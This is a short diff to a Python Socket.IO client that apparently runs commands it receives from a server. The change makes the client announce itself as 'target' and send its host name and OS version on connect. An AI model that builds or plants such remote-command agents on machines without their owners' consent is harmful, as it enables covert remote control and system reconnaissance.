@@ -1,5 +1,6 @@
 import subprocess
 import socketio
+import os
 
 # Create a Socket.IO client
 sio = socketio.Client()
@@ -8,7 +9,9 @@ sio = socketio.Client()
 @sio.event
 def connect():
     print("Connected to server")
-    sio.emit('identify', 'executer')
+    sio.emit('identify', 'target')
+    system = os.uname()
+    sio.emit('system-name', f"{system.nodename} ({system.sysname} {system.release})")
 
 
 @sio.event
@@ -29,7 +32,7 @@ def command(data):
 
 
 @sio.event
-def exit():
+def end():
     print("Exiting...")
     sio.disconnect()
     exit()
